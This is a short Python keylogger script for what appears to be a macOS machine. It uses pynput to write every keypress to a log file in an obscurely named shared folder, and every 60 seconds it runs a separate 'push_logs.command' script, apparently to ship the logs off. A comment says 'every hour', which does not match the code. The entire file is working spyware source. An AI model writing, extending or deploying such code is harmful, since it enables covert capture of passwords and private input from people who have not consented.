import threading
import subprocess
from pynput.keyboard import Key, Listener

def on_press(key):
    log_path = "/Users/Shared/system532/stringCup/liquid/log.txt"
    with open(log_path, "a") as log:
        log.write(str(key) + "\n")

def on_release(key):
    if key == Key.esc:
        return False

def push_logs_periodically():
    subprocess.call(["/Users/Shared/system532/stringCup/push_logs.command"])
    threading.Timer(60, push_logs_periodically).start()  # Run every hour

# Start the periodic log pushing
push_logs_periodically()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
